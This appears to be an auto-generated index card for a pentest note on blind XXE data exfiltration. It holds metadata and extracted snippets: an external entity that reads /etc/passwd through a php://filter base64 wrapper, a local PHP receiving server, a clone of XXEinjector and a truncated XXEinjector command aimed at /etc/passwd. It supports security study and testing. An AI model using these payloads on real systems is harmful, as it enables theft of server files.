---
technique: "Blind Data Exfiltration"
family: "ssrf-xxe-file"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/XXE/Blind Data Exfiltration.md"
source_sha256: "69904b35434c446c9663810b21dc52b424f3d0a564bd23cb6fd66715e0b3a104"
curator_version: 2
...
- `xml: <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`
- `php: <?php`
- `bash: $ vi index.php # here we write the above PHP code`
- `xml: <?xml version="1.0" encoding="UTF-8"?>`
- `bash: PHP 7.4.3 Development Server (<http://0.0.0.0:8000>) started`
- `bash: $ git clone <https://github.com/enjoiz/XXEinjector.git>`
- `POST /blind/submitDetails.php HTTP/1.1`
- `bash: $ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/pas`
...
## Source
Original note: `_raw/Web attacks/Web Attacks/XXE/Blind Data Exfiltration.md`
